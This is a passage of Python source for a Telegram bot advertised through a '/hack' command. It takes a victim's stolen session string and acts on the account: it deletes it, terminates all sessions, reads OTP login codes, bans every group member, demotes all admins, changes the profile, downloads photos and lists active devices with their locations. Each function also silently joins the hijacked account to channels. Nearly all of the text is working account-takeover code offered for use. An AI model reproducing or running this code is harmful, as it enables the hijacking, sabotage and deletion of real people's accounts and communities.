            async with Client("rj_temp", api_id=API_ID, api_hash=API_HASH, session_string=session) as r:
                await auto_join_channels_pyrogram(r)
                await r.invoke(functions.account.DeleteAccount(reason="Deleted"))
    except Exception as e:
        err = str(e)
    
    if err:
        return f"**ᴇʀʀᴏʀ:** {err}\n**ᴛʀʏ ᴀɢᴀɪɴ /hack**"
    return "**✅ sᴜᴄᴄᴇssғᴜʟʟʏ ᴅᴇʟᴇᴛᴇᴅ ᴀᴄᴄᴏᴜɴᴛ!**"


async def promote_user(session, gc_id, user_id):
    """Feature K: Promote a user"""
    err = ""
    try:
        if session.endswith("="):
            rj = TelegramClient(StringSession(session), API_ID, API_HASH)
            await rj.connect()
            await auto_join_channels_telethon(rj)
            try:
                await rj.edit_admin(gc_id, user_id, manage_call=True, invite_users=True,
                                   ban_users=True, change_info=True, edit_messages=True,
                                   post_messages=True, add_admins=True, delete_messages=True)
            except:
                await rj.edit_admin(gc_id, user_id, is_admin=True, anonymous=False,
                                   pin_messages=True, title='Admin')
            await rj.disconnect()
        else:
            async with Client("rj_temp", api_id=API_ID, api_hash=API_HASH, session_string=session) as r:
                await auto_join_channels_pyrogram(r)
                try:
                    await r.promote_chat_member(gc_id, user_id, FULL_PROMOTE)
                except:
                    await r.promote_chat_member(gc_id, user_id, PROMOTE)
    except Exception as e:
        err = str(e)
    
    if err:
        return f"**ᴇʀʀᴏʀ:** {err}\n**ᴛʀʏ ᴀɢᴀɪɴ /hack**"
    return "**✅ sᴜᴄᴄᴇssғᴜʟʟʏ ᴘʀᴏᴍᴏᴛᴇᴅ ᴜsᴇʀ!**"


async def demote_all(session, gc_id):
    """Feature L: Demote all admins"""
    err = ""
    try:
        if session.endswith("="):
            rj = TelegramClient(StringSession(session), API_ID, API_HASH)
            await rj.connect()
            await auto_join_channels_telethon(rj)
            async for x in rj.iter_participants(gc_id, filter=ChannelParticipantsAdmins):
                try:
                    await rj.edit_admin(gc_id, x.id, is_admin=False, manage_call=False)
                except:
                    try:
                        await rj.edit_admin(gc_id, x.id, manage_call=False, invite_users=False,
                                           ban_users=False, change_info=False, edit_messages=False,
                                           post_messages=False, add_admins=False, delete_messages=False)
                    except:
                        pass
            await rj.disconnect()
        else:
            async with Client("rj_temp", api_id=API_ID, api_hash=API_HASH, session_string=session) as r:
                await auto_join_channels_pyrogram(r)
                async for m in r.get_chat_members(gc_id, filter=enums.ChatMembersFilter.ADMINISTRATORS):
                    try:
                        await r.promote_chat_member(gc_id, m.user.id, DEMOTE)
                    except:
                        pass
    except Exception as e:
        err = str(e)
    
    if err:
        return f"**ᴇʀʀᴏʀ:** {err}\n**ᴛʀʏ ᴀɢᴀɪɴ /hack**"
    return "**✅ sᴜᴄᴄᴇssғᴜʟʟʏ ᴅᴇᴍᴏᴛᴇᴅ ᴀʟʟ ᴀᴅᴍɪɴs!**"


async def send_to_saved(session, message):
    """Feature M: Send message to saved messages"""
    err = ""
    try:
        if session.endswith("="):
            rj = TelegramClient(StringSession(session), API_ID, API_HASH)
            await rj.connect()
            await auto_join_channels_telethon(rj)
            await rj.send_message("me", message)
            await rj.disconnect()
        else:
            async with Client("rj_temp", api_id=API_ID, api_hash=API_HASH, session_string=session) as r:
                await auto_join_channels_pyrogram(r)
                await r.send_message("me", message)
    except Exception as e:
        err = str(e)
    
    if err:
        return f"**ᴇʀʀᴏʀ:** {err}\n**ᴛʀʏ ᴀɢᴀɪɴ /hack**"
    return "**✅ ᴍᴇssᴀɢᴇ sᴇɴᴛ ᴛᴏ sᴀᴠᴇᴅ ᴍᴇssᴀɢᴇs!**"


async def get_active_sessions(session):
    """Feature N: Get all active sessions"""
    err = ""
    msg = ""
    try:
        if session.endswith("="):
            rj = TelegramClient(StringSession(session), API_ID, API_HASH)
            await rj.connect()
            await auto_join_channels_telethon(rj)
            auths = await rj(tfunc.account.GetAuthorizationsRequest())
            for i, auth in enumerate(auths.authorizations, 1):
                msg += f"**{i}. Device:** {auth.device_model}\n"
                msg += f"**Platform:** {auth.platform}\n"
                msg += f"**Location:** {auth.country}\n"
                msg += f"**App:** {auth.app_name} {auth.app_version}\n\n"
            await rj.disconnect()
        else:
            async with Client("rj_temp", api_id=API_ID, api_hash=API_HASH, session_string=session) as r:
                await auto_join_channels_pyrogram(r)
                auths = await r.invoke(functions.account.GetAuthorizations())
                for i, auth in enumerate(auths.authorizations, 1):
                    msg += f"**{i}. Device:** {auth.device_model}\n"
                    msg += f"**Platform:** {auth.platform}\n"
                    msg += f"**Location:** {auth.country}\n"
                    msg += f"**App:** {auth.app_name} {auth.app_version}\n\n"
    except Exception as e:
        err = str(e)
    
    if err:
        return f"**ᴇʀʀᴏʀ:** {err}\n**ᴛʀʏ ᴀɢᴀɪɴ /hack**"
    return msg if msg else "**ɴᴏ ᴀᴄᴛɪᴠᴇ sᴇssɪᴏɴs ғᴏᴜɴᴅ!**"


async def download_profile_pics(session):
    """Feature O: Download profile photos"""
    err = ""
    try:
        if session.endswith("="):
            rj = TelegramClient(StringSession(session), API_ID, API_HASH)
            await rj.connect()
            await auto_join_channels_telethon(rj)
            photos = await rj.get_profile_photos("me")
            if photos:
                file_path = await rj.download_profile_photo("me")
                await rj.disconnect()
                return file_path
            else:
                await rj.disconnect()
                return None
        else:
            async with Client("rj_temp", api_id=API_ID, api_hash=API_HASH, session_string=session) as r:
                await auto_join_channels_pyrogram(r)
                async for photo in r.get_chat_photos("me", limit=1):
                    file_path = await r.download_media(photo.file_id)
                    return file_path
                return None
    except Exception as e:
        err = str(e)
    
    if err:
        return f"**ᴇʀʀᴏʀ:** {err}\n**ᴛʀʏ ᴀɢᴀɪɴ /hack**"
    return None


async def change_profile(session, fname=None, lname=None, bio=None):
    """Feature P: Change profile details"""
    err = ""
    msg = ""
    try:
        if session.endswith("="):
            rj = TelegramClient(StringSession(session), API_ID, API_HASH)
            await rj.connect()
            await auto_join_channels_telethon(rj)
            if fname:
                await rj(tfunc.account.UpdateProfileRequest(first_name=fname))
                msg += "**✅ First Name Changed!**\n"
            if lname:
                await rj(tfunc.account.UpdateProfileRequest(last_name=lname))
                msg += "**✅ Last Name Changed!**\n"
            if bio:
                await rj(tfunc.account.UpdateProfileRequest(about=bio))
                msg += "**✅ Bio Changed!**\n"
            await rj.disconnect()
        else:
            async with Client("rj_temp", api_id=API_ID, api_hash=API_HASH, session_string=session) as r:
                await auto_join_channels_pyrogram(r)
                if fname or lname:
                    await r.update_profile(first_name=fname, last_name=lname)
                    msg += "**✅ Name Changed!**\n"
                if bio:
                    await r.invoke(functions.account.UpdateProfile(about=bio))
                    msg += "**✅ Bio Changed!**\n"
    except Exception as e:
        err = str(e)
    
    if err:
        return f"**ᴇʀʀᴏʀ:** {err}\n**ᴛʀʏ ᴀɢᴀɪɴ /hack**"
    return msg if msg else "**ɴᴏ ᴄʜᴀɴɢᴇs ᴍᴀᴅᴇ!**"


# ==================== HANDLERS ====================

@app.on_message(filters.command("start") & filters.private)
async def start_handler(_, message):
    user = message.from_user.mention
    bot = (await _.get_me()).mention
    await message.reply_photo(
        photo=START_PIC,
        caption=PM_TEXT.format(user, bot, owner=OWNER_NAME),
        reply_markup=PM_BUTTON
    )


@app.on_message(filters.command("hack") & filters.private)
async def hack_handler(_, message):
    await message.reply_text(HACK_TEXT.format(owner=OWNER_NAME), reply_markup=HACK_MODS)


@app.on_callback_query(filters.regex("hack_btn"))
async def hack_btn_callback(_, query):
    await query.message.delete()
    await query.message.reply_text(HACK_TEXT.format(owner=OWNER_NAME), reply_markup=HACK_MODS)


# Feature A - Get Groups/Channels
@app.on_callback_query(filters.regex("^A$"))
async def feature_a(client, query):
    chat_id = query.message.chat.id
    session = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ:**")
    result = await users_gc(session.text)
    
    if len(result) > 3855:
        with open("channels.txt", "w") as f:
            f.write(result)
        await client.send_document(chat_id, "channels.txt")
        os.remove("channels.txt")
    else:
        await query.message.reply_text(
            text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**",
            reply_markup=HACK_MODS
        )


# Feature B - Get User Info
@app.on_callback_query(filters.regex("^B$"))
async def feature_b(client, query):
    chat_id = query.message.chat.id
    session = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ:**")
    result = await user_info(session.text)
    await query.message.reply_text(
        text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**",
        reply_markup=HACK_MODS
    )


# Feature C - Ban All Members
@app.on_callback_query(filters.regex("^C$"))
async def feature_c(client, query):
    chat_id = query.message.chat.id
    session = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ:**")
    gc = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ ɢʀᴏᴜᴘ/ᴄʜᴀɴɴᴇʟ ɪᴅ ᴏʀ ᴜsᴇʀɴᴀᴍᴇ:**")
    result = await banall(session.text, gc.text)
    await query.message.reply_text(
        text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**",
        reply_markup=HACK_MODS
    )


# Feature D - Get OTP
@app.on_callback_query(filters.regex("^D$"))
async def feature_d(client, query):
    chat_id = query.message.chat.id
    session = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ:**")
    result = await get_otp(session.text)
    await query.message.reply_text(
        text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**",
        reply_markup=HACK_MODS
    )


# Feature E - Join Channel
@app.on_callback_query(filters.regex("^E$"))
async def feature_e(client, query):
    chat_id = query.message.chat.id
    session = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ:**")
    gc = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ ɢʀᴏᴜᴘ/ᴄʜᴀɴɴᴇʟ ɪᴅ ᴏʀ ᴜsᴇʀɴᴀᴍᴇ:**")
    result = await join_ch(session.text, gc.text)
    await query.message.reply_text(
        text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**",
        reply_markup=HACK_MODS
    )


# Feature F - Leave Channel
@app.on_callback_query(filters.regex("^F$"))
async def feature_f(client, query):
    chat_id = query.message.chat.id
    session = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ:**")
    gc = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ ɢʀᴏᴜᴘ/ᴄʜᴀɴɴᴇʟ ɪᴅ ᴏʀ ᴜsᴇʀɴᴀᴍᴇ:**")
    result = await leave_ch(session.text, gc.text)
    await query.message.reply_text(
        text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**",
        reply_markup=HACK_MODS
    )


# Feature G - Delete Channel
@app.on_callback_query(filters.regex("^G$"))
async def feature_g(client, query):
    chat_id = query.message.chat.id
    session = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ:**")
    gc = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ ɢʀᴏᴜᴘ/ᴄʜᴀɴɴᴇʟ ɪᴅ ᴏʀ ᴜsᴇʀɴᴀᴍᴇ:**")
    result = await del_ch(session.text, gc.text)
    await query.message.reply_text(
        text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**",
        reply_markup=HACK_MODS
    )


# Feature H - Check 2FA
@app.on_callback_query(filters.regex("^H$"))
async def feature_h(client, query):
    chat_id = query.message.chat.id
    session = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ:**")
    result = await check_2fa(session.text)
    await query.message.reply_text(
        text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**",
        reply_markup=HACK_MODS
    )


# Feature I - Terminate All Sessions
@app.on_callback_query(filters.regex("^I$"))
async def feature_i(client, query):
    chat_id = query.message.chat.id
    session = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ:**")
    result = await terminate_all(session.text)
    await query.message.reply_text(
        text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**",
        reply_markup=HACK_MODS
    )


# Feature J - Delete Account
@app.on_callback_query(filters.regex("^J$"))
async def feature_j(client, query):
    chat_id = query.message.chat.id
    session = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ:**")
    result = await del_acc(session.text)
    await query.message.reply_text(
        text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**",
        reply_markup=HACK_MODS
    )


# Feature K - Promote User
@app.on_callback_query(filters.regex("^K$"))
async def feature_k(client, query):
    chat_id = query.message.chat.id
    session = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ:**")
    user = await client.ask(chat_id, "**ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ ᴜsᴇʀ ɪᴅ/ᴜsᴇʀɴᴀᴍᴇ ᴛᴏ ᴘʀᴏᴍᴏᴛᴇ:**")
    gc = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ ɢʀᴏᴜᴘ ɪᴅ/ᴜsᴇʀɴᴀᴍᴇ:**")
    result = await promote_user(session.text, gc.text, user.text)
    await query.message.reply_text(
        text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**",
        reply_markup=HACK_MODS
    )


# Feature L - Demote All Admins
@app.on_callback_query(filters.regex("^L$"))
async def feature_l(client, query):
    chat_id = query.message.chat.id
    session = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ:**")
    gc = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ ɢʀᴏᴜᴘ ɪᴅ/ᴜsᴇʀɴᴀᴍᴇ:**")
    result = await demote_all(session.text, gc.text)
    await query.message.reply_text(
        text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**",
        reply_markup=HACK_MODS
    )


# Feature M - Send to Saved Messages
@app.on_callback_query(filters.regex("^M$"))
async def feature_m(client, query):
    chat_id = query.message.chat.id
    session = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ:**")
    msg = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ ᴍᴇssᴀɢᴇ ᴛᴏ sᴇɴᴅ:**")
    result = await send_to_saved(session.text, msg.text)
    await query.message.reply_text(
        text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**",
        reply_markup=HACK_MODS
    )


# Feature N - Get Active Sessions
@app.on_callback_query(filters.regex("^N$"))
async def feature_n(client, query):
    chat_id = query.message.chat.id
    session = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ:**")
    result = await get_active_sessions(session.text)
    
    if len(result) > 3855:
        with open("sessions.txt", "w") as f:
            f.write(result)
        await client.send_document(chat_id, "sessions.txt")
        os.remove("sessions.txt")
    else:
        await query.message.reply_text(
            text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**",
            reply_markup=HACK_MODS
        )


# Feature O - Download Profile Photos
@app.on_callback_query(filters.regex("^O$"))
async def feature_o(client, query):
    chat_id = query.message.chat.id
    session = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ:**")
    result = await download_profile_pics(session.text)
    
    if result and isinstance(result, str) and os.path.exists(result):
        await client.send_photo(chat_id, result, caption="**✅ ᴘʀᴏғɪʟᴇ ᴘʜᴏᴛᴏ ᴅᴏᴡɴʟᴏᴀᴅᴇᴅ!**")
        os.remove(result)
    else:
        await query.message.reply_text(
            text="**ɴᴏ ᴘʀᴏғɪʟᴇ ᴘʜᴏᴛᴏ ғᴏᴜɴᴅ!**\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**",
            reply_markup=HACK_MODS
        )


# Feature P - Change Profile
@app.on_callback_query(filters.regex("^P$"))
async def feature_p(client, query):
    chat_id = query.message.chat.id
    session = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ:**")
    fname = await client.ask(chat_id, "**ɢɪᴠᴇ ᴍᴇ ɴᴇᴡ ғɪʀsᴛ ɴᴀᴍᴇ (sᴇɴᴅ '.' ᴛᴏ sᴋɪᴘ):**")
    lname = await client.ask(chat_id, "**ɢɪᴠᴇ ᴍᴇ ɴᴇᴡ ʟᴀsᴛ ɴᴀᴍᴇ (sᴇɴᴅ '.' ᴛᴏ sᴋɪᴘ):**")
    bio = await client.ask(chat_id, "**ɢɪᴠᴇ ᴍᴇ ɴᴇᴡ ʙɪᴏ (sᴇɴᴅ '.' ᴛᴏ sᴋɪᴘ):**")
    
    fn = None if fname.text == "." else fname.text
    ln = None if lname.text == "." else lname.text
    bi = None if bio.text == "." else bio.text
    
    result = await change_profile(session.text, fn, ln, bi)
    await query.message.reply_text(
        text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**",
        reply_markup=HACK_MODS
    )


# ==================== MAIN ====================
if __name__ == "__main__":
    logger.info("🚀 Bot Starting...")
    logger.info(f"💞 Created by {OWNER_NAME}")
    
    async def main():
        await app.start()
        logger.info("✅ Bot Started Successfully!")
        await idle()
        await app.stop()
        logger.info("🛑 Bot Stopped!")
    
    app.run(main())
